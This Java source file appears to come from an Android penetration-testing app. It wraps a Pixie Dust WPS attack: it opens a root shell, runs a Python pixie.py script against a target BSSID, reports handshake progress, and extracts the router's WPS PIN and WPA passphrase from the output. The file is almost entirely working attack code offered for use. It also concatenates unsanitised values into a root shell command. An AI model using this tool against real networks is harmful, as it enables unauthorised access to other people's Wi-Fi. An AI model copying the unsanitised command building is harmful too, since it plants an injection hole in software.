package com.zalexdev.stryker.wifi.utils;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;
import android.text.Html;
import android.text.Spanned;
import android.util.Log;
import android.widget.TextView;
import com.zalexdev.stryker.utils.Core;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;

public class PixieDust extends AsyncTask<Void, String, ArrayList<String>> {
    public String exec = Core.EXECUTE;

    @SuppressLint("StaticFieldLeak")
    public Context mContext;
    @SuppressLint("StaticFieldLeak")
    public Activity mActivity;
    @SuppressLint("StaticFieldLeak")
    public final TextView output;
    public String bssid;
    public String wifi_name;
    public Core core;

    public PixieDust(Context context, Activity activity, final TextView out, String bssid1, String wifi_name1,Core c) {
        mContext = context;
        mActivity = activity;
        output = out;
        bssid = bssid1;
        wifi_name = wifi_name1;
        core =c;
    }
    @Override
    protected void onPreExecute() {
        super.onPreExecute();

    }

    @SuppressLint("WrongThread")
    @Override
    protected ArrayList<String> doInBackground(Void... command) {
            String line;
        ArrayList<String> issuccess = new ArrayList<>();
            appendtext(green("Starting Pixie Dust..."),output);
            try {
                Process process = Runtime.getRuntime().exec("su -mm");
                OutputStream stdin = process.getOutputStream();
                InputStream stderr = process.getErrorStream();
                InputStream stdout = process.getInputStream();

                String cmd = "timeout 45 python3 -u /CORE/PixieWps/pixie.py -i "+core.getString("wlan_scan")+" --iface-down -K -F -b "+bssid;
                if (core.getBoolean("pixie_off")){
                    stdin.write((exec+" '"+cmd+"'"+" &&echo PIXIEFINISHED"+ '\n').getBytes());
                }else {
                    stdin.write(("svc wifi disable&&sleep 2&&" + exec + " '" + cmd + "'" + " &&echo PIXIEFINISHED&&sleep 2&&svc wifi enable" + '\n').getBytes());
                }stdin.write(("exit\n").getBytes());
                stdin.flush();
                stdin.close();
                ArrayList<String> out2 = new ArrayList<>();
                ArrayList<String> outerror = new ArrayList<>();
                BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
                while ((line = br.readLine()) != null) {

                    out2.add(line);
                    onProgressUpdate(line);
                }
                br.close();
                br = new BufferedReader(new InputStreamReader(stderr));
                while ((line = br.readLine()) != null) {
                    onProgressUpdate(line);
                outerror.add(line);
                }
                core.writetolog(out2,false);
                core.writetolog(outerror,true);
                br.close();
                process.waitFor();
                process.destroy();
                issuccess = pixie(out2);
                if (process.exitValue() != 0){
                    issuccess = new ArrayList<>();
                    issuccess.add("error");
                }
            } catch (IOException e) {
                Log.d(TAG, "An IOException was caught: " + e.getMessage());
            } catch (InterruptedException ex) {
                Log.d(TAG, "An InterruptedException was caught: " + ex.getMessage());
            }
            if (issuccess.size() == 0){
                issuccess.add("false");
            }
        return issuccess;
    }

    @Override
    protected void onPostExecute(ArrayList<String> result) {
        if (result.size() == 0){
            result.add("false");
        }
        super.onPostExecute(result);
    }

    @Override
    protected void onProgressUpdate(String... values) {
        super.onProgressUpdate(values);
        String temp = values[0];
        if (temp.contains("Trying pin")){
            appendtext(white("[!] Sending pin..."),output);
        }else if( temp.contains("Associated")){
            appendtext(green("[+] AP founded"),output);
        }else if( temp.contains("Message M1")){
            appendtext(green("[+] M1 Recived"),output);
        }else if( temp.contains("Message M2")){
            appendtext(green("[+] Sending M2..."),output);
        }else if( temp.contains("E-Nonce")){
            appendtext(white("[!] Recived E-Nonce from AP..."),output);
        }else if( temp.contains("PKR: ")){
            appendtext(green("[+] PKR recived"),output);
        }else if( temp.contains("PKE: ")){
            appendtext(green("[+] PKE recived"),output);
        }else if( temp.contains("AuthKey: ")){
            appendtext(green("[+] AuthKey recived"),output);
        }else if( temp.contains("Message M4 ")){
            appendtext(white("[!] Sending M4"),output);
        }else if( temp.contains("[+] WPS pin: ")){
            appendtext(green("[+] WPS pin found: "+temp.replace("[+] WPS pin: ","")),output);
        }
    }

public void appendtext(Spanned text,TextView textView){
        mActivity.runOnUiThread(() -> {
            textView.append(text);
            textView.append("\n");
        });
}


public ArrayList<String> pixie(ArrayList<String> out){
        String pin;
        String pass;
        String stat = "false";
        ArrayList<String> back = new ArrayList<>();
        for (int i = 0;i<out.size();i++){
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")){
                pin = s.replace("[+] WPS PIN: ","").replaceAll("'","");
                stat = "true";
                back.add(pin);
            } else if (s.contains("[+] WPA PSK:")){
                pass = s.replace("[+] WPA PSK: ","").replaceAll("'","");
                stat = "true";
                back.add(pass);
            } else if (s.contains("Terminated") && !stat.equals("true")){
                stat = "timeout";
            }
        }
        if (out.size() == 0){
            stat = "error";
        }
        back.add(0,stat);
        return back;

}
    public Spanned green (String out){
        return Html.fromHtml("<font color='#19D121'>"+out+"</font>");
    }
    public Spanned white (String out){
        return Html.fromHtml("<font color='#FFFFFF'>"+out+"</font>");
    }


}
